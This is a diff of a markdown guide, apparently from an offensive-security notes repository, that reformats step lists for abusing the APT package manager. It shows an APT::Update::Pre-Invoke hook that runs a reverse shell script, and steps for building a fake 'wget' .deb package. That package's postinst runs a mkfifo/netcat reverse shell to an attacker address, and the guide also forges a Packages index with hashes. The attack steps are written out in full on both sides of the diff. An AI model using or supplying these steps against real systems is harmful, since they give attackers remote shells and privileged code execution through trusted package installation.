@@ -2,7 +2,9 @@
 
 ### Steps:
 
-#### 1) APT::Update::Pre-Invoke {"/bin/bash /tmp/pwn.sh"} (Create a malicious config file (pwnapt) that calls your reverse shell script)
+#### 1) Create a malicious config file (pwnapt) that calls your reverse shell script
+
+    APT::Update::Pre-Invoke {"/bin/bash /tmp/pwn.sh"} 
 
 #### 2) Create a reverse shell file (pwn.sh)
 
@@ -24,67 +26,91 @@
 
 ### Steps:
 
-#### 1) mkdir build
+#### 1) 
 
-#### 2) mkdir -p wget/DEBIAN
+    mkdir build
 
-#### 3) nano/vim wget/DEBIAN/control (Create the control file with the metadata)
+#### 2) 
 
-##### Package: wget
+    mkdir -p wget/DEBIAN
 
-##### Architecture: all
+#### 3) 
 
-##### Maintainer: @WHATEVER
+    nano/vim wget/DEBIAN/control (Create the control file with the metadata)
 
-##### Priority: optional
+#### Control file contents
 
-##### Version: 5.0
+    Package: wget
 
-##### Description: GGEZ!
+    Architecture: all
 
-#### 4) mkdir -p wget/usr/bin
+    Maintainer: @WHATEVER
 
-#### 5) nano/vim wget/usr/bin/wget (Make a dummy binary)
+    Priority: optional
 
-##### #!/bin/bash
+    Version: 5.0
 
-##### echo "Whatever"
+    Description: GGEZ!
 
-#### 6) chmod 700 wget/usr/bin/mypackage
+#### 4) 
 
-#### 7) nano/vim wget/DEBIAN/postinst (Create the malicious script)
+    mkdir -p wget/usr/bin
 
-##### #!/bin/bash
+#### 5) 
 
-##### rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc OUR_IP PORT
+    nano/vim wget/usr/bin/wget (Make a dummy binary)
 
-#### 8) chmod 755 wget/DEBIAN/postinst
+#### Dummy binary contents 
 
-#### 9) dpkg-deb --build wget/ (Package it)
+    #!/bin/bash
+
+    echo "Whatever"
+
+#### 6) 
+
+    chmod 700 wget/usr/bin/mypackage
+
+#### 7) 
+
+    nano/vim wget/DEBIAN/postinst (Create the malicious script)
+
+#### Malicious script (postinst) contents
+
+    #!/bin/bash
+
+    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc OUR_IP PORT
+
+#### 8) 
+
+    chmod 755 wget/DEBIAN/postinst
+
+#### 9) 
+
+    dpkg-deb --build wget/ (Package it)
 
 #### 10) Create a file named "Packages" with the contents:
 
-##### Package: wget
+    Package: wget
 
-##### Version: 5.0
+    Version: 5.0
 
-##### Maintainer: WHATEVER
+    Maintainer: WHATEVER
 
-##### Architecture: all
+    Architecture: all
 
-##### Description: Pwnie package
+    Description: Pwnie package
 
-##### Multi-Arch: foreign
+    Multi-Arch: foreign
 
-##### Filename: pwn/wget.deb
+    Filename: pwn/wget.deb
 
-##### Size: 800
+    Size: 800
 
-##### MD5sum: e5c858d924abbe4effcd1fe1ca4eb21a
+    MD5sum: e5c858d924abbe4effcd1fe1ca4eb21a
 
-##### SHA1: 6822716507fe71737c635995f3f8f049d8b3cdf9
+    SHA1: 6822716507fe71737c635995f3f8f049d8b3cdf9
 
-##### SHA256: 76a31c4e20bf4530027004bf7794b9c7993960d51933ce772b1594d4fc74aca5
+    SHA256: 76a31c4e20bf4530027004bf7794b9c7993960d51933ce772b1594d4fc74aca5
 
 ### (You can gain the hashes for the .deb file with the md5sum, sha256sum and sha1sum respectively and the size can be gained with ls -la)
 
